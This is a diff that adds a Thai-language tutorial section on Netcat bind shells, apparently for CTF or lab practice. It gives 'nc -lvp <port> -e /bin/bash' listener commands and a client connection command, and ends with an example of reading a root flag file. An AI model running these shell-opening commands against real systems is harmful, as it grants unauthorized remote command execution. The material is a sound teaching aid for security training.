@@ -102,6 +102,37 @@ cat <file> | nc 192.168.1.1 10000
 
 > เมื่อเสร็จแล้ว server ปลายทางจะได้รับ <file> มา หรือหากใช้ > ก็จะกลายเป็น save ลงไฟล์ out.txt นั่นเอง
 
+## เชื่อมต่อ Bind Shell ด้วย Netcat
 
+### Bind Shell
 
+> Bind Shell คือการที่เราทำให้เครื่องเป้าหมายนั้นเปิด Listener รอรับการเชื่อมต่อ จากนั้นเราจึงเชื่อมต่อไปยัง port ที่เปิดไว้
 
+> ที่ฝั่ง Server รันคำสั่งเป็น
+
+```
+nc -lvp <port> -e /bin/bash
+```
+
+หรือ
+
+```
+nc -lvp <port> -e /bin/sh
+```
+> นั่นคือเราจะรัน server การเชื่อมต่อจาก client เมื่อมี client เชื่อมต่อเข้ามา netcat listener ของเราจะรันคำสั่งตามที่กำหนดไว้ตาม -e option ซึ่งในที่นี้คือ /bin/bash
+
+### ที่ฝั่ง Client รันคำสั่งเป็น
+
+```
+nc <TARGET> <PORT>
+```
+
+> เมื่อเราพิมพ์คำสั่งใด ๆ จากฝั่ง client ก็จะนำไปประมวลที่ฝั่ง server ผ่าน /bin/bash แล้วแสดงผลกลับมาให้ฝั่ง client ซึ่งทำให้เปรียบเสมือนเราอยู่หน้าเครื่อง server นั่นเอง
+
+### ตัวอย่างการใช้งาน
+
+> เชื่อมต่อเข้าไปยัง bind shell ที่รันไว้ใน port 10000 จากนั้นจะพบ flag ที่ /root/flag.txt
+
+![Screenshot 2024-05-29 152653](https://github.com/Atiwitch15101/Netcat/assets/159407312/134ce678-5dac-449f-b331-f470d06c36b2)
+
+![Screenshot 2024-05-29 152549](https://github.com/Atiwitch15101/Netcat/assets/159407312/5fa9ef21-2c70-48f6-80b9-a51d37b7b272)
